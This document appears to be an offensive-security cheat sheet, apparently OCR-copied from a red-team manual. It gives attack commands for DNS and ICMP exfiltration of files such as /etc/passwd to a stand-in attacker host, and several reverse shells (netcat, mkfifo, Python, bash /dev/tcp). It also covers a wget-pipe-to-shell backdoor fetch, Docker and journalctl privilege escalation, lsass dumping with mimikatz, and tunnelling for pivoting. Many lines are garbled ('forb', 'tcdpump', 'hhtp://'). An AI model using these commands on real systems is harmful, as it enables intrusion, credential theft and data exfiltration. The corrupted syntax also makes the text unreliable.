# Tips and Tricks

## Data Transfer
### Transfer by ftp without direct access to the shell

* On victim:
```bash
#1. Hex encode the file to be transferred
   xxd -p secret file.hex
#2. Read in each line and do a DNS lookup
   forb in 'cat fole.hex '; do dig $b.shell.evilexample.com; done
```
* On attacker:
```bash
#1. Capture DNS exfil packets
   tcdpump -w /tmp/dns -s0 port 53 and host system.example.com
#2. Cut the exfilled hex from the DNS packet
   tcpdump -r dnsdemo -n | grep shell.evilexample.com | cut -f9 -d'
   cut -f1 -d'.' | uniq received. txt
#3. Reverse the hex encoding
   xxd -r -p received~.txt kefS.pgp
```

### Execution of the exfil command and transferring its information with icmp

* On victim (never ending 1 liner) :
```bash
stringz=cat /etc/passwd | od -tx1 | cut -c8- | tr -d " " | tr -d "\n";
counter=0; while (($counter = ${#stringZ})) ;do ping -s 16 -c l -p
${stringZ:$counter:16} 192.168.10.10 &&
counter=$( (counter+~6)) ;done
```

* On attacker (capture pac~ets to data.dmp and parse):
```bash
tcpdump -ntvvSxs 0 'icmp[0]=8' data.dmp
grep Ox0020 data.dmp | cut -c21- | tr -d " " | tr -d "\n" | xxd -r -p
```

### Open mail relay
```bash
telnet x.x.x.x 25
HELO x.x.x.x
MAIL FROM: me@you.com
RCPT TO: YOU@YOU.com
DATA
Thank You.
quit
```

## Reverse shell
* Netcat command (run on the attacker's system)
```bash
nc 10.0.0.1 1234 -e /bin/sh    #Linux reverse shell
nc 10.0.0.1 1234 -e cmd.exe    #Windows reverse shell
```

* Netcat command (-e may not be supported in some versions)
```bash
nc -e /bin/sh 10.0.0.1 1234
```

* Netcat command (when -e is not supported)
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/fl/bin/sh -i 2 &line l0.0.0.1 1234 /tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.105 9999 >/tmp/f
```

* Python
```python
python -c 'import socket, subprocess, os; s=socket. socket (socket.AF_INET,
socket.SOCK_STREAM); s.connect( ("10.0.0.1",1234)); os.dup2 (s.fileno() ,0);
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
```

* Bash
```bash
bash -i & /dev/tcp/10.0.0.1/8080 0 &1
```

* Other way
```bash
wget hhtp:// server /backdoor.sh -O- | sh Downloads and runs backdoor.sh
```

## Privilege Escalation
* Privilege Escalation with Docker

You must be logged in with a user who is a member of the docker group.
```bash
docker run -v /root:/mnt -it ubuntu
```
OR
```bash
docker run --rm -it --privileged nginx bash
mkdir /mnt/fsroot
mount /dev/sda /mnt/fsroot
```

* Privilege Escalation with journalctl

The journalctl launcher must be run with more privileges such as sudo.
```bash
journalctl
!/bin/sh
```
OR
```bash
sudo journalctl
!/bin/sh
```

## Receiving the lsass process and extracting information with mimikatz
```bash
procdump.exe -accepteula -64 -ma lsass.exe  lsass.dmp
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords f
```

## Extracting information in memory using the mimikatz plugin in volatility
```bash
volatility — plugins=/usr/share/volatility/plugins — profile=Win7SP0x86 -f halomar.dmp mimikatz
```

## Tunnel
* Fpipe - receiving information from port 1234 and transferring to port 80 2.2.2.2
```bash
fpipe.exe -l 1234 -r 80 2.2.2.2
```

* Socks.exe - Intranet scanning in Socks proxy

**On redirector (1.1.1.1):**
```bash
socks.exe -i1.1.1.1 -p 8C80
```

**On attacker:**
```bash
Modify /etc/proxjchains.conf:
Comment out: #proxy_dns
Comment out: #socks4a 127.0.0.1    9050
Add line: socks4    1.1.1.1    8080
Scan through socks proxy:
    proxychains nmap -PN -vv -sT -p 22,135,139,445 2.2.2.2
```

* Socat - receiving information from port 1234 and transferring to port 80 2.2.2.2
```bash
socat TCP4:LISTEN:1234 TCP4:2.2.2.2:80
```

* Create ssh without ssh service
```bash
./socat TCP-LISTEN:22,fork,reuseaddr TCP:172.10.10.11:22
```

* Stunnel - ssl encapsulated in nc tunnel (Windows & Linux)
  
**On attacker (client):**
```bash
#Modify /stunnel.conf
    clien = yes
    [netcat client]
    accept = 5555
    connect = -Listening IP-:4444

nc -nv 127.0.0.1 5555
```

**On victim (listening server)**
```bash
#Modify /stunnel.conf
    client = no
    [ne~cat server]
    accept = 4444
    connect = 7777

nc -vlp 7777
```
